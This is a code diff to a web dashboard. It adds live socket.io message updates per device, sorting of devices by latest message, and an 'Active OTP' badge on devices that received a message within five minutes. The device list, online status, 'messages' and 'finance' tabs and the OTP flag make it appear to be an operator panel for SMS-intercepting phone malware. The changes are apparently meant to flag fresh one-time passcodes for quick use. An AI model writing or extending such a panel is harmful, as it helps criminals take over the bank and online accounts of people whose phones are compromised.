@@ -742,8 +742,31 @@
         input:checked + .slider:before {
             transform: translateX(18px);
         }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
 
     </style>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        socket.on('newMessage', (msg) => {
+            const k = msg.srcKey + ':' + msg.deviceId;
+            if (!window.cache[k]) window.cache[k] = [];
+            window.cache[k].push({ ...msg, _localId: Date.now() + '-' + Math.random().toString(36).substr(2, 9) });
+            window.cache[k].sort((a,b) => (a.timestamp||0) - (b.timestamp||0));
+            
+            // If viewing this device's messages, re-render
+            if (window.selDev && window.selDev._id === msg.deviceId && window.selDev._src === msg.srcKey) {
+                if(window.curTab === 'messages' || window.curTab === 'finance') {
+                    // Update cache silently and render tab
+                    if(typeof renderTab === 'function') renderTab();
+                }
+            }
+        });
+    </script>
 </head>
 <body>
 
@@ -1739,6 +1762,15 @@ function filterDevs() {
         }
         return true;
     });
+    
+    filtered.sort((a, b) => {
+        const tA = a.lastMessageTime || 0;
+        const tB = b.lastMessageTime || 0;
+        if (tA !== tB) return tB - tA; // Highest timestamp first
+        if (a.status !== b.status) return b.status - a.status; // Online first
+        return 0;
+    });
+
     document.getElementById('devCount').textContent = `DEVICES (${filtered.length})`;
     renderDevList();
 }
@@ -1832,7 +1864,10 @@ function renderDevList() {
         <div class="device-card ${act}" id="card-${d._src}-${d._id}" onclick="select('${d._src}','${d._id}')" oncontextmenu="showContextMenu(event, '${d._src}', '${d._id}')">
             <div class="d-icon">📱<div class="d-status ${d.status?'on':'off'}"></div></div>
             <div class="d-info">
-                <div class="d-id">${esc(d._id)}</div>
+                <div class="d-id">
+                    ${esc(d._id)}
+                    ${(d.lastMessageTime && (Date.now() - d.lastMessageTime) < 5*60*1000) ? '<span style="width:8px;height:8px;border-radius:50%;background:var(--accent);display:inline-block;box-shadow:0 0 10px var(--accent);margin-left:8px;animation:pulse 2s infinite;" title="Active OTP"></span>' : ''}
+                </div>
                 <div class="d-sub">
                     <span id="ph-${d._id}">${esc(ph)}</span>
                     ${(window.CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;background:var(--cyan);color:#000;border-radius:3px;font-size:0.65rem;margin-left:4px;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
@@ -1860,6 +1895,12 @@ function select(src, id) {
     } else {
         renderTab();
     }
+    if (window.currentSocketRoom) {
+        socket.emit('unsubscribe', window.currentSocketRoom);
+    }
+    window.currentSocketRoom = { srcKey: src, id: id };
+    socket.emit('subscribe', window.currentSocketRoom);
+
     fetchMsgs(selDev);
 }
 
